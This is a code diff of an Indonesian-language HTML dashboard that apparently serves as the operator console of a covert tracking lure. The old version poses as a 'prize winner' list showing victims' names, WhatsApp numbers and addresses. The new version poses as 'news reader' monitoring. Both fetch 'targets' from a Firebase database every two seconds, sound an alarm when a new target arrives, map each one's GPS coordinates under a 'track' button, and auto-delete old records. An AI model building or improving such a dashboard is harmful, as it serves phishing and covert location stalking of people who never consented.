@@ -2,44 +2,66 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Dashboard Pemenang Hadiah</title>
+    <title>NEWS CONTROL CENTER - Monitoring Reader</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0b0e14; color: #00ff41; padding: 20px; margin: 0; }
-        .grid { display: grid; grid-template-columns: 1fr 450px; gap: 20px; }
-        .card { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; color: #c9d1d9; }
-        th, td { padding: 10px; border: 1px solid #30363d; text-align: left; font-size: 11px; }
-        th { background: #00ff41; color: #000; font-size: 10px; }
-        .session-time { color: #fbbf24; }
-        .map-box { height: 350px; background: #000; border: 1px solid #00ff41; margin-top: 10px; }
-        iframe { width: 100%; height: 100%; border: none; filter: invert(90%); }
+        :root { --news-red: #cc0000; --terminal-green: #00ff41; --panel-bg: #0b0e14; }
+        body { font-family: 'Courier New', Courier, monospace; background: var(--panel-bg); color: var(--terminal-green); padding: 20px; margin: 0; text-transform: uppercase; }
+        
+        .header { border-bottom: 2px solid var(--news-red); padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .live-indicator { color: var(--news-red); animation: blink 1s infinite; font-weight: bold; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+
+        .grid { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
+        .card { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; }
+        
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; color: #c9d1d9; font-size: 12px; }
+        th, td { padding: 12px; border: 1px solid #30363d; text-align: left; }
+        th { background: var(--news-red); color: white; font-size: 10px; border: none; }
+        
+        .btn-detail { background: var(--terminal-green); color: black; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; font-family: inherit; }
+        .btn-detail:hover { background: white; }
+
+        .map-box { height: 350px; background: #000; border: 1px solid var(--terminal-green); margin-top: 15px; border-radius: 4px; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); } /* Dark Mode Map */
+
+        .stats-box { font-size: 14px; margin-bottom: 15px; padding: 10px; border-left: 4px solid var(--news-red); background: rgba(255,0,0,0.05); }
+        .info-label { color: #8b949e; font-size: 10px; }
     </style>
 </head>
 <body>
 
-<h1>[ SISTEM MONITORING DATA PEMENANG ]</h1>
+<div class="header">
+    <div>[ SYSTEM: NEWS MONITORING v3.0 ]</div>
+    <div class="live-indicator">● LIVE FEED</div>
+</div>
 
 <div class="grid">
     <div class="card">
-        <h3>LIST PENGUNJUNG & FORMULIR</h3>
+        <div class="stats-box">
+            TOTAL PEMBACA TERDETEKSI: <span id="totalCount">0</span>
+        </div>
         <table>
             <thead>
                 <tr>
-                    <th>NAMA</th>
-                    <th>WHATSAPP</th>
-                    <th>ALAMAT</th>
-                    <th>SESI</th>
+                    <th>ID READER</th>
+                    <th>STATUS VERIFIKASI</th>
+                    <th>WAKTU BACA</th>
+                    <th>PERANGKAT</th>
                     <th>AKSI</th>
                 </tr>
             </thead>
-            <tbody id="targetList"></tbody>
+            <tbody id="readerList"></tbody>
         </table>
     </div>
 
     <div class="card">
-        <h3>DETAIL LOKASI & INFO</h3>
-        <div id="infoBox">Klik tombol "DETAIL" pada tabel.</div>
-        <div class="map-box" id="mapBox"></div>
+        <h3>RADAR KOORDINAT</h3>
+        <div id="detailBox">
+            <p class="info-label">Pilih reader dari tabel untuk melacak posisi...</p>
+        </div>
+        <div class="map-box" id="mapBox">
+            <div style="padding: 20px; text-align: center;">MENUNGGU DATA GPS...</div>
+        </div>
     </div>
 </div>
 
@@ -47,53 +69,73 @@
 
 <script>
     const BASE_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets";
-    let known = new Set();
+    let knownReaders = new Set();
 
-    function update() {
-        fetch(`${BASE_URL}.json`)
-        .then(res => res.json())
-        .then(data => {
-            const tbody = document.getElementById('targetList');
-            if (!data) { tbody.innerHTML = "<tr><td colspan='5'>Menunggu pengunjung...</td></tr>"; return; }
+    async function updateDashboard() {
+        try {
+            const res = await fetch(`${BASE_URL}.json`);
+            const data = await res.json();
+            const tbody = document.getElementById('readerList');
+            
+            if (!data) {
+                tbody.innerHTML = "<tr><td colspan='5' style='text-align:center'>TIDAK ADA AKTIVITAS PEMBACA...</td></tr>";
+                document.getElementById('totalCount').innerText = "0";
+                return;
+            }
 
             let html = "";
+            let count = 0;
+
             for (let id in data) {
-                const t = data[id];
-                const diff = Math.floor((Date.now() - t.start_time) / 1000);
+                const r = data[id];
+                count++;
                 
-                // Alarm untuk pendatang baru
-                if (!known.has(id)) {
+                // Hitung durasi sejak buka link
+                const durationSec = Math.floor((Date.now() - r.start_time) / 1000);
+                const durationStr = `${Math.floor(durationSec/60)}M ${durationSec%60}S`;
+
+                // Bunyikan alarm jika ada pembaca baru yang masuk
+                if (!knownReaders.has(id)) {
                     document.getElementById('alarmSound').play().catch(()=>{});
-                    known.add(id);
+                    knownReaders.add(id);
                 }
 
-                // Pembersihan otomatis jika tidak aktif > 5 menit
-                if ((Date.now() - t.updated_at) > 300000) {
+                // Auto-delete data yang sudah lewat 10 menit (agar DB tidak penuh)
+                if ((Date.now() - r.updated_at) > 600000) {
                     fetch(`${BASE_URL}/${id}.json`, { method: 'DELETE' });
                     continue;
                 }
 
                 html += `
                     <tr>
-                        <td><b>${t.nama}</b></td>
-                        <td>${t.phone}</td>
-                        <td style="max-width:150px; overflow:hidden;">${t.alamat}</td>
-                        <td class="session-time">${Math.floor(diff/60)}m ${diff%60}d</td>
-                        <td><button onclick="showDetail('${t.lat}','${t.lon}','${t.nama}','${t.phone}','${t.alamat}')" style="background:#00ff41; border:none; padding:5px; font-size:10px; cursor:pointer;">DETAIL</button></td>
+                        <td style="color: #58a6ff;">${id}</td>
+                        <td style="color: ${r.status.includes('Selesai') ? '#00ff41' : '#fbbf24'}">${r.status}</td>
+                        <td>${durationStr}</td>
+                        <td style="font-size: 10px;">${r.device || 'MOBILE'}</td>
+                        <td><button class="btn-detail" onclick="showTrack('${r.lat}','${r.lon}','${id}')">LACAK</button></td>
                     </tr>
                 `;
             }
             tbody.innerHTML = html;
-        });
+            document.getElementById('totalCount').innerText = count;
+        } catch (e) { console.error("Sync Error"); }
     }
 
-    function showDetail(lat, lon, nama, phone, alamat) {
-        document.getElementById('infoBox').innerHTML = `<b>Pemenang:</b> ${nama} (${phone})<br><b>Alamat:</b> ${alamat}`;
-        const mURL = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=16&ie=UTF8&iwloc=&output=embed`;
-        document.getElementById('mapBox').innerHTML = `<iframe src="${mURL}"></iframe>`;
+    function showTrack(lat, lon, id) {
+        document.getElementById('detailBox').innerHTML = `
+            <div style="background: #0d1117; padding: 10px; border: 1px solid #30363d;">
+                <b style="color:white">TARGET:</b> ${id}<br>
+                <b style="color:white">LAT:</b> ${lat}<br>
+                <b style="color:white">LON:</b> ${lon}
+            </div>
+        `;
+        // Map menggunakan Dark Mode Filter
+        const mapUrl = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=17&ie=UTF8&iwloc=&output=embed`;
+        document.getElementById('mapBox').innerHTML = `<iframe src="${mapUrl}"></iframe>`;
     }
 
-    setInterval(update, 2000);
+    setInterval(updateDashboard, 2000);
 </script>
+
 </body>
 </html>
